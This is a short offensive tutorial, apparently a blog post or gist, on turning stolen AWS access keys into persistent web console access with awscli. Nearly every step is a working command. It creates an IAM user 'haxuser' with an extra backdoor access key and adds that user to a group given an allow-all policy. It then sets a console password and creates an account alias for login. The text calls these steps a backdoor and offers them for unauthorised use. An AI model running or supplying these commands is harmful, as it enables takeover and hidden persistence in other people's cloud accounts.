Gaining Access to AWS Web Console via stolen access keys & awscli in 7 steps

Step 1) Create a temp user

Step 2) Create access key for new temp user (can skip this step but its a cool backdoor)

```aws iam create-access-key --user-name haxuser```

Step 3) Create a new temp group for new temp user

```aws iam create-group --group-name haxuser```

Step 4) Assign group policy for temp group granting all access

```aws iam put-group-policy --group-name haxuser --policy-name haxuser --policy-document '{"Version":"2012-10-17", "Statement": [{"Sid": "Stmt1437414476731", "Action": "*", "Effect": "Allow", "Resource": "*" }]}'```

Step 5) Add temp user to temp group

```aws iam add-user-to-group --group-name haxuser --user-name haxuser```

Step 6) Create a login profile for temp user with a SUPER COOL password

```aws iam create-login-profile --user-name haxuser --password 'SuperDuperCoolPassword'```

Step 7) Create an account alias so you can access the account web console

```aws iam create-account-alias --account-alias haxuseralias```

Now you can login directly using the new alias! Browse: hxxps://haxuseralias.signin.aws.amazon.com/console/
